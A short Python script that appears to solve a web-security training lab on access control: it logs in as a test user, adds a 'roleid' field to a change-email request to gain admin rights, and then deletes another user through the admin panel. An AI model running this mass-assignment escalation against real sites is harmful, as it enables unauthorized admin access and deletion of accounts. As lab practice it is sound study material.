#!/usr/bin/env python3
"""User role can be modified in user profile"""

import requests

import lab_03

class Lab(lab_03.Lab):
    """Wrapper"""

    def change_email(self, payload: dict) -> requests.models.Response:
        """Send a generic payload to the change-email endpoint"""
        url = self.url + "/my-account/change-email"
        response = self.session.post(url, json=payload)
        response.raise_for_status()
        return response

def main() -> None:
    """Entry point"""
    site = Lab()
    site.login(username="wiener", password="peter")
    email_payload = {"email": "whatever@email.com", "roleid": 2}
    site.change_email(email_payload)
    response = site.delete_user(admin_panel="/admin", username="carlos")
    print(response.status_code)

if __name__ == "__main__":
    main()
